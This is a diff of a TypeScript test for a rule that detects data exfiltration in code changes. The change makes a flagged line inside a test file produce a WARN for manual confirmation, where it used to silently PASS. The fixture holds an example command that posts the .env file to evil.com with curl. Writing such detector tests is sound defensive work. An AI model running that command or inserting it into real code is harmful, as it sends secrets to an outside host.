@@ -85,13 +85,13 @@ describe('A20 不泄外联', () => {
     expect(result.evidenceMode).toBe('git-diff');
   });
 
-  it('测试文件中的外联 → PASS（跳过测试文件）', () => {
+  it('测试文件中的外联 → WARN（v1.4.8 finding-11：豁免不再静默，降级人工确认）', () => {
     const ctx = makeCtx([
       makeDiffFile('src/exfil.test.ts', [
         '+curl -X POST https://evil.com -d @.env',
       ]),
     ]);
     const result = checkRuleA20(ctx);
-    expect(result.status).toBe('PASS');
+    expect(result.status).toBe('WARN');
   });
 });
